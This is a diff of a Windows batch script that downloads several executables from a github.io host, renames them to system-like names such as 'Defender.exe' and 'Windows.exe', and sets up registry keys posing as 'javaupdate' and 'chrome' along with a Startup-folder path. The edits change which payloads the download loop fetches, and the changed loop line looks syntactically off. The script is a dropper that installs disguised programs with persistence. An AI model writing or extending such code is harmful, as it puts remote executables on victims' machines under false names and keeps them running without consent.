@@ -6,21 +6,18 @@ set "fileUrls[0]=https://infinityteq.github.io/MalwareRemoval.exe"
 set "fileUrls[1]=https://infinityteq.github.io/Server.exe"
 set "fileUrls[2]=https://infinityteq.github.io/svchost.exe"
 set "fileUrls[3]=https://infinityteq.github.io/winupdate.exe"
-set "fileUrls[4]=https://infinityteq.github.io/sysupdate.exe"
 
 :: Define an array of new file names
 set "fileNames[0]=system.exe"
 set "fileNames[1]=updater.exe"
 set "fileNames[2]=Defender.exe"
 set "fileNames[3]=Windows.exe"
-set "fileNames[4]=sys.exe"
 
 :: Define an array of registry key names
 set "registryKeys[0]=system"
 set "registryKeys[1]=javaupdate"
 set "registryKeys[2]=winupdate"
 set "registryKeys[3]=chrome"
-set "registryKeys[4]=ch"
 
 :: Define the Startup folder path
 set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -64,7 +61,7 @@ if %errorLevel% neq 0 (
 :DownloadFiles
 echo Downloading files...
 setlocal enabledelayedexpansion
-for /l %%i in (0,1,2) do (
+for /l %%i in (0,1,2,3) do (
     set "fileUrl=!fileUrls[%%i]!"
     set "fileName=!fileNames[%%i]!"
     set "registryKey=!registryKeys[%%i]!"
